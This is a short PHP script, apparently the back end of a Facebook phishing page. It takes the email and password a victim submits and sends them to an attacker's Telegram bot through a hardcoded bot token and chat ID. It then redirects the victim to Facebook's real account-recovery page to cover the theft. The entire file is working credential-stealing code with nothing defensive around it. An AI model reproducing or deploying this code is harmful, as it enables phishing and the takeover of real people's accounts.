<?php

// Telegram bot API token and chat ID
$token = "5570597619:AAHZJKaRF-ttV7FkPv8OjdQ883SlYrl02QM";
$chat_id = "1251593717";

// Get the email and password from the POST request
$email = $_POST['email'];
$pass = $_POST['pass'];

// Format the message
$message = "Email/Number: $email\nPassword: $pass";

// Send the message to Telegram
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
$response = file_get_contents($url);

// Redirect to Facebook login page
header('Location: https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr');
exit();
?>
